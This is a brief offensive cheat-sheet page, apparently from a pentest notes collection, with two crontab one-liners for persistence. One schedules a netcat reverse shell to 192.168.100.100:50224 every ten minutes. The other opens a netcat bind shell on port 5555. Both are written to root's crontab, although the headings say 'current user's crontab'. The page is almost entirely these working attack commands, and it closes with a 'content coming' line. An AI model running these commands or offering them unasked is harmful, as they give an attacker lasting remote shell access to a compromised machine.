# Place Holder

## Add a new cron job to the current user's crontab that will try to connect back to 192.168.100.100:50224 every 10 minutes:
```(crontab -u root -l; echo "*/10 * * * * nc 192.168.100.100 50224 -e /bin/bash") | crontab -u root -```

## Add a new cron job to the current user's crontab that will try to open a bind port every 10 minutes on port 5555:
```(crontab -u root -l; echo "*/10 * * * * nc -lvp 5555 -e /bin/bash") | crontab -u root -```

Content coming. Feel free to submit ;-)
